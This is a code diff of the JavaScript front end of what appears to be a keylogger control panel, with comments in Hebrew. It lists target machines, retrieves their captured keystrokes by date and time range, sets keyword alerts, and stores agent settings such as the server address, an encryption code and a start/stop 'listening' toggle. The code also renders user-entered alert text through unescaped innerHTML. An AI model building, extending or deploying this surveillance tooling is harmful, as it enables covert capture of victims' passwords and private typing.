@@ -1,161 +1,280 @@
-document.addEventListener('DOMContentLoaded', () => {
-    const computersList = document.getElementById('computers-list');
-    const logsPage = document.getElementById('logs-page');
-    const homePageSections = document.querySelectorAll('.computers-section, .alerts-section, .agent-section');
-    const navLinks = document.querySelectorAll('.nav-links a');
-    const logComputerName = document.getElementById('log-computer-name');
-    const logsList = document.getElementById('logs-list');
-    const toggleAgentBtn = document.getElementById('toggle-agent-btn');
+// ===== מצב ושמירה מקומית =====
+const LS_KEYS = {
+  apiBase: "kl_api_base",
+  alerts:  "kl_alerts",
+  agent:   "kl_agent_settings",
+  agentOn: "kl_agent_enabled",
+};
 
-    // כתובת ה-URL של השרת
-    const SERVER_URL = 'http://127.0.0.1:5000/api';
+let API_BASE = localStorage.getItem(LS_KEYS.apiBase) || "http://127.0.0.1:5000/api";
+const setApiBase = (v) => { API_BASE = v; localStorage.setItem(LS_KEYS.apiBase, v); };
 
-    // פונקציה לשליפת רשימת המחשבים מהשרת
-    async function fetchComputers() {
-        try {
-            const response = await fetch(`${SERVER_URL}/get_target_machines_list`);
-            if (!response.ok) {
-                throw new Error('Failed to fetch computers list');
-            }
-            const computers = await response.json();
-            renderComputers(computers);
-        } catch (error) {
-            console.error('Error fetching computers:', error);
-            computersList.innerHTML = `<p class="error-message">שגיאה בטעינת רשימת המחשבים. נסה שוב מאוחר יותר.</p>`;
-        }
+// ===== עוזרים =====
+const $ = (sel) => document.querySelector(sel);
+const $$ = (sel) => Array.from(document.querySelectorAll(sel));
+const fmtJSON = (obj) => JSON.stringify(obj, null, 2);
+const normTime = (t) => {
+  if (!t) return null;
+  const parts = String(t).replace("%3A", ":").split(":");
+  const hh = String(parts[0]).padStart(2,"0");
+  const mm = parts[1] ? String(parts[1]).padStart(2,"0") : "00";
+  const ss = parts[2] ? String(parts[2]).padStart(2,"0") : null;
+  return ss ? `${hh}:${mm}:${ss}` : `${hh}:${mm}`;
+};
+const weekdayName = (dateStr) => {
+  if (!dateStr) return "";
+  const d = new Date(dateStr);
+  const names = ["ראשון","שני","שלישי","רביעי","חמישי","שישי","שבת"];
+  return names[d.getDay()];
+};
+
+// ===== ניווט בין דפים =====
+function showPage(id){
+  $$(".page").forEach(p => p.classList.add("hidden"));
+  $(`#page-${id}`).classList.remove("hidden");
+  $$(".nav-links a").forEach(a => a.classList.toggle("active", a.dataset.page === id));
+}
+
+// ===== API קריאות =====
+async function apiGetMachines(){
+  const res = await fetch(`${API_BASE}/get_target_machines_list`, { mode:"cors" });
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+  return res.json();
+}
+
+async function apiGetKeystrokes({machine, date, start, end}){
+  if (!machine) throw new Error("בחר מחשב");
+  const qs = new URLSearchParams({ machine });
+  if (date)  qs.append("date", date);
+  if (start) qs.append("start", normTime(start));
+  if (end)   qs.append("end",   normTime(end));
+  const url = `${API_BASE}/get_keystrokes?${qs.toString()}`;
+  const res = await fetch(url, { mode:"cors" });
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+  return res.json(); // מערך מחרוזות JSON (תוכן קבצים)
+}
+
+// ===== מחשבים (בית + לוגים) =====
+async function refreshMachines(){
+  const strip = $("#machines-strip");
+  const ddl   = $("#logs-machine");
+  strip.innerHTML = '<span class="muted">טוען...</span>';
+  $("#machines-status").textContent = "";
+
+  try{
+    const list = await apiGetMachines();
+    strip.innerHTML = "";
+    ddl.innerHTML = "";
+
+    if (!Array.isArray(list) || list.length === 0){
+      strip.innerHTML = '<span class="muted">לא נמצאו מחשבים</span>';
+      $("#machines-status").textContent = "אין מחשבים זמינים בתיקיית הלוגים.";
+      return;
     }
 
-    // פונקציה המעדכנת את רשימת המחשבים ב-HTML
-    function renderComputers(computers) {
-        computersList.innerHTML = '';
-        if (computers.length === 0) {
-            computersList.innerHTML = `<p class="no-data-message">לא נמצאו מחשבים במערכת.</p>`;
-            return;
-        }
-        computers.forEach(name => {
-            const computerCard = document.createElement('div');
-            computerCard.className = 'computer-card';
-            computerCard.innerHTML = `<button class="btn computer-btn" data-computer-name="${name}">${name}</button>`;
-            computersList.appendChild(computerCard);
-        });
-    }
+    list.forEach(name => {
+      // Chip בבית
+      const btn = document.createElement("button");
+      btn.className = "machine-chip";
+      btn.textContent = name;
+      btn.onclick = () => {
+        $$(".machine-chip").forEach(b => b.classList.remove("active"));
+        btn.classList.add("active");
+        showPage("logs");
+        $("#logs-machine").value = name;
+      };
+      strip.appendChild(btn);
 
-    // פונקציה לשליפת הלוגים של מחשב ספציפי
-    async function fetchLogs(computerName) {
-        try {
-            const response = await fetch(`${SERVER_URL}/get_keystrokes?machine=${computerName}`);
-            if (!response.ok) {
-                throw new Error('Failed to fetch logs');
-            }
-            const logs = await response.json();
-            renderLogs(logs);
-        } catch (error) {
-            console.error('Error fetching logs:', error);
-            logsList.innerHTML = `<p class="error-message">שגיאה בטעינת הלוגים עבור ${computerName}.</p>`;
-        }
-    }
-
-    // פונקציה המציגה את הלוגים שנשלפו מהשרת
-    function renderLogs(logs) {
-        logsList.innerHTML = '';
-        if (logs.length === 0) {
-            logsList.innerHTML = `<p class="no-data-message">לא נמצאו לוגים עבור מחשב זה.</p>`;
-            return;
-        }
-        logs.forEach(log => {
-            // הנתונים מהשרת הם מחרוזות JSON, יש להמיר אותן לאובייקט
-            try {
-                const logObject = JSON.parse(log);
-                for (const time in logObject) {
-                    const logItem = document.createElement('div');
-                    logItem.className = 'log-item';
-                    logItem.innerHTML = `<strong>[${time}]</strong>: ${logObject[time].text}`;
-                    logsList.appendChild(logItem);
-                }
-            } catch (e) {
-                console.error("Failed to parse log JSON:", log);
-                const logItem = document.createElement('div');
-                logItem.className = 'log-item';
-                logItem.textContent = `שגיאת עיצוב: ${log}`;
-                logsList.appendChild(logItem);
-            }
-        });
-    }
-
-    // מעבר בין דפי המערכת
-    function navigateTo(page) {
-        if (page === 'home') {
-            homePageSections.forEach(section => section.classList.remove('hidden'));
-            logsPage.classList.add('hidden');
-        } else if (page === 'logs') {
-            homePageSections.forEach(section => section.classList.add('hidden'));
-            logsPage.classList.remove('hidden');
-        }
-    }
-
-    // טיפול בלחיצה על קישורי הניווט
-    navLinks.forEach(link => {
-        link.addEventListener('click', (e) => {
-            e.preventDefault();
-            navLinks.forEach(item => item.classList.remove('active'));
-            link.classList.add('active');
-
-            if (link.textContent === 'לוגים') {
-                alert('יש לבחור מחשב כדי לראות לוגים.');
-                // נשארים בעמוד הבית כדי שהמשתמש יוכל לבחור מחשב
-            } else if (link.textContent === 'בית') {
-                navigateTo('home');
-            }
-        });
+      // Dropdown בלוגים
+      const opt = document.createElement("option");
+      opt.value = name; opt.textContent = name;
+      ddl.appendChild(opt);
     });
+  }catch(err){
+    console.error(err);
+    strip.innerHTML = '<span class="muted">שגיאה בטעינת המחשבים</span>';
+    $("#machines-status").textContent = "שגיאה בתקשורת לשרת.";
+  }
+}
 
-    // טיפול בלחיצה על כפתור מחשב
-    computersList.addEventListener('click', (e) => {
-        if (e.target.classList.contains('computer-btn')) {
-            const computerName = e.target.getAttribute('data-computer-name');
-            logComputerName.textContent = computerName;
-            navigateTo('logs');
-            fetchLogs(computerName); // קריאה לפונקציה ששולפת לוגים מהשרת
-        }
+// ===== התראות (localStorage לעת עתה) =====
+function loadAlerts(){
+  try{ return JSON.parse(localStorage.getItem(LS_KEYS.alerts) || "[]"); }
+  catch{ return []; }
+}
+function saveAlerts(arr){ localStorage.setItem(LS_KEYS.alerts, JSON.stringify(arr)); }
+function renderAlerts(){
+  const wrap = $("#alerts-list");
+  const alerts = loadAlerts();
+  wrap.innerHTML = alerts.length ? "" : '<div class="muted">אין התראות. צור התראה חדשה.</div>';
+  alerts.forEach(a => {
+    const card = document.createElement("div");
+    card.className = "alert-card";
+    card.innerHTML = `
+      <h3>${a.title}</h3>
+      <div class="muted">מילות מפתח:</div>
+      <div>${(a.keywords||[]).map(k=>`<span class="alert-chip">${k}</span>`).join(" ") || "-"}</div>
+      <div style="margin-top:8px;">
+        <button class="btn" data-del="${a.id}">מחק</button>
+      </div>
+    `;
+    wrap.appendChild(card);
+  });
+
+  wrap.querySelectorAll("[data-del]").forEach(btn=>{
+    btn.addEventListener("click", ()=>{
+      const id = btn.getAttribute("data-del");
+      const next = loadAlerts().filter(x => x.id !== id);
+      saveAlerts(next);
+      renderAlerts();
+      // TODO: בעתיד אפשר לשלוח DELETE לשרת: fetch(`${API_BASE}/alerts/${id}`, { method:"DELETE" })
     });
+  });
+}
 
-    // טיפול בניהול הסוכן (למשל, שינוי URL או הפעלה/השבתה)
-    const urlInput = document.getElementById('url-input');
-    const encryptionInput = document.getElementById('encryption-input');
-    const waitTimeInput = document.getElementById('wait-time-input');
+function createAlert(title, keywordsCsv){
+  const id = crypto.randomUUID();
+  const keywords = (keywordsCsv||"").split(",").map(s=>s.trim()).filter(Boolean);
+  const alerts = loadAlerts();
+  alerts.push({ id, title, keywords, createdAt: Date.now() });
+  saveAlerts(alerts);
+  renderAlerts();
+  // TODO: בעתיד POST לשרת: fetch(`${API_BASE}/alerts`, { method:"POST", body: JSON.stringify({title, keywords}), headers:{'Content-Type':'application/json'} })
+}
 
-    // Event listeners for agent management buttons
-    document.querySelector('.agent-section').addEventListener('click', (e) => {
-        if (e.target.tagName === 'BUTTON' && e.target.textContent === 'שמור') {
-            const parent = e.target.closest('.option-item');
-            const label = parent.querySelector('label').textContent;
+// ===== Agent settings (localStorage לעת עתה) =====
+function loadAgent(){
+  try{ return JSON.parse(localStorage.getItem(LS_KEYS.agent) || "{}"); }
+  catch{ return {}; }
+}
+function saveAgent(obj){
+  localStorage.setItem(LS_KEYS.agent, JSON.stringify(obj));
+}
+function renderAgent(){
+  const st = loadAgent();
+  $("#agent-api-base").value = API_BASE;
+  $("#agent-enc-code").value = st.enc || "";
+  $("#agent-wait-sec").value = st.waitSec ?? "";
+  const isOn = localStorage.getItem(LS_KEYS.agentOn) === "1";
+  $("#btn-toggle-agent").textContent = isOn ? "עצירת האזנה" : "התחלת האזנה";
+  $("#btn-toggle-agent").classList.toggle("btn-toggle", isOn);
+}
 
-            // This is just a placeholder. In a real-world scenario, you would send a request to the server
-            // to update these settings.
-            if (parent.querySelector('input')) {
-                const value = parent.querySelector('input').value;
-                alert(`הגדרת "${label}" עודכנה ל: ${value}`);
-                // await fetch(`${SERVER_URL}/update_agent_setting`, { ... });
-            }
-        }
+// ===== לוגים =====
+function setWeekday(){
+  const d = $("#logs-date").value;
+  $("#weekday-label").textContent = d ? `יום ${weekdayName(d)}` : "";
+}
+
+async function fetchLogs(){
+  $("#logs-status").textContent = "טוען...";
+  $("#logs-results").innerHTML = "";
+
+  const machine = $("#logs-machine").value;
+  const date = $("#logs-date").value;
+  const start = $("#logs-start").value;
+  const end = $("#logs-end").value;
+
+  try{
+    const arr = await apiGetKeystrokes({ machine, date, start, end });
+    if (!arr || !arr.length){
+      $("#logs-status").textContent = "לא נמצאו נתונים לטווח שבחרת.";
+      return;
+    }
+    $("#logs-status").textContent = `נמצאו ${arr.length} קבצים.`;
+
+    arr.forEach((item, i) => {
+      let obj = null;
+      if (typeof item === "string"){
+        try{ obj = JSON.parse(item); }catch{ obj = null; }
+      } else if (item && typeof item === "object"){
+        obj = item;
+      }
+
+      const card = document.createElement("div");
+      card.className = "log-card";
+      const title = document.createElement("div");
+      title.className = "log-title";
+      title.textContent = `קובץ #${i+1}`;
+      card.appendChild(title);
+
+      const pre = document.createElement("pre");
+      pre.textContent = obj ? fmtJSON(obj) : String(item);
+      card.appendChild(pre);
+
+      $("#logs-results").appendChild(card);
     });
+  }catch(err){
+    console.error(err);
+    $("#logs-status").textContent = "שגיאה בשליפת נתונים מהשרת.";
+  }
+}
 
-    // Event listener for agent toggle button
-    toggleAgentBtn.addEventListener('click', () => {
-        // This is a placeholder for a server call to start/stop the agent
-        // Example: await fetch(`${SERVER_URL}/toggle_agent`, { ... });
-
-        if (toggleAgentBtn.textContent === 'התחלת האזנה') {
-            toggleAgentBtn.textContent = 'עצירת האזנה';
-            toggleAgentBtn.classList.add('active');
-            alert('האזנה החלה!');
-        } else {
-            toggleAgentBtn.textContent = 'התחלת האזנה';
-            toggleAgentBtn.classList.remove('active');
-            alert('האזנה הופסקה!');
-        }
+// ===== אירועים ואתחול =====
+document.addEventListener("DOMContentLoaded", ()=>{
+  // ניווט
+  $$(".nav-links a").forEach(a => {
+    a.addEventListener("click", (e)=>{
+      e.preventDefault();
+      showPage(a.dataset.page);
     });
+  });
 
-    // בדיקות ראשוניות בטעינת הדף
-    fetchComputers();
+  // בית: מחשבים
+  $("#btn-refresh-machines").addEventListener("click", refreshMachines);
+
+  // התראות: יצירה/מחיקה
+  $("#alert-form").addEventListener("submit", (e)=>{
+    e.preventDefault();
+    const title = $("#alert-title").value.trim();
+    const keywords = $("#alert-keywords").value.trim();
+    if (!title) return;
+    createAlert(title, keywords);
+    e.target.reset();
+  });
+
+  // סוכן: שמירה/טוגל
+  $("#btn-save-api").addEventListener("click", ()=>{
+    const val = $("#agent-api-base").value.trim();
+    if (!val) return alert("נא להזין כתובת API");
+    setApiBase(val);
+    alert("כתובת API נשמרה.");
+  });
+  $("#btn-save-enc").addEventListener("click", ()=>{
+    const st = loadAgent();
+    st.enc = $("#agent-enc-code").value;
+    saveAgent(st);
+    alert("קוד הצפנה נשמר מקומית.");
+    // TODO: בעתיד POST לשרת
+  });
+  $("#btn-save-wait").addEventListener("click", ()=>{
+    const st = loadAgent();
+    const n = Number($("#agent-wait-sec").value);
+    st.waitSec = Number.isFinite(n) ? n : null;
+    saveAgent(st);
+    alert("זמן המתנה נשמר מקומית.");
+    // TODO: בעתיד POST לשרת
+  });
+$("#btn-toggle-agent").addEventListener("click", () => {
+  const isOn = localStorage.getItem(LS_KEYS.agentOn) === "1";
+  localStorage.setItem(LS_KEYS.agentOn, isOn ? "0" : "1"); // ← תוקן
+  renderAgent();
+  alert(isOn ? "האזנה הופסקה." : "האזנה החלה.");
+});
+
+  // לוגים
+  $("#logs-date").addEventListener("change", setWeekday);
+  $("#btn-fetch-logs").addEventListener("click", fetchLogs);
+
+  // אתחול ראשוני
+  renderAlerts();
+  renderAgent();
+
+  // מלא תאריך של היום בלוגים
+  const d = new Date();
+  const dstr = `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}`;
+  $("#logs-date").value = dstr;
+  setWeekday();
+
+  refreshMachines();
 });
